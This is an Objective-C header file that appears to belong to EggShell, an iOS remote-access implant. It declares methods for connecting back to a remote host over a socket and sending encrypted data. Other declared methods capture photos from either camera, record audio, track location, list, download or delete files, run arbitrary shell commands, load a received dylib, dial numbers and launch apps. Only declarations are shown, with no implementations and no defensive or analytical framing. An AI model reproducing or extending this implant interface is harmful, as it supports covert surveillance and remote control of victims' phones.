//
//espl.h
#include <arpa/inet.h>
#import <AppSupport/CPDistributedMessagingCenter.h>
#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <CoreLocation/CoreLocation.h>
#import <CoreFoundation/CFUserNotification.h>
#import "FBEncryptorAES.h"
#import <MediaPlayer/MediaPlayer.h>
#include "NSData+AESCrypt.h"
#include "SpringBoardServices/SpringBoardServices.h"
#import <UIKit/UIKit.h>

@interface espl:NSObject {
    NSString *TERM;
}

@property (nonatomic,strong) AVCaptureSession *session;
@property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
@property (retain) AVAudioRecorder *recorder;
@property (retain) NSFileManager *fileManager;
@property (retain) NSString *skey;
@property (retain) CPDistributedMessagingCenter *messagingCenter;


//socks
extern int sockfd;
-(int)connect:(NSString*)host
             :(long)port;
-(void)sendData:(NSData *)data;
-(void)sendString:(NSString *)string :(NSString *)key;

//convenience
-(NSString *)forgetFirst:(NSArray *)args;
-(void)blank;

//camera
-(void)camera:(BOOL)isfront;
-(AVCaptureDevice *)frontFacingCameraIfAvailable;
-(AVCaptureDevice *)backFacingCameraIfAvailable;
-(void)setupCaptureSession:(BOOL)isfront;
-(void)captureWithBlock:(void(^)(NSData* imageData))block;

//file management
-(void)directoryList:(NSArray *)args;
-(void)rmFile:(NSArray *)args;
-(void)changeWD:(NSArray *)args;
-(void)sendEncryptedFile:(NSData *)fileData;
-(void)download:(NSArray *)args;
-(void)encryptFile:(NSArray *)args;
-(void)decryptFile:(NSArray *)args;

//misc
extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);
extern CFStringRef SBSApplicationLaunchingErrorString(int error);
-(void)locate;
-(void)exec:(NSString *)command;
-(void)receiveDYLIB;
-(void)vibrate;
-(void)say:(NSString *)string;
-(void)displayalert:(const char *)title :(const char *)message;
-(void)alert:(NSArray *)cmdarray;
-(void)getPid;
-(void)openURL:(NSArray *)args;
-(void)dial:(NSArray *)args;
-(void)setVolume:(NSArray *)args;
-(void)getVolume;
-(void)isplaying;
-(void)listapps;
-(void)launchApp:(NSArray *)args;

//eggshell pro
-(void)mcSendNoReply:(NSString *)message;
-(void)mcSendYesReply:(NSString *)message;
-(void)locationService:(NSArray *)args;

@end

//
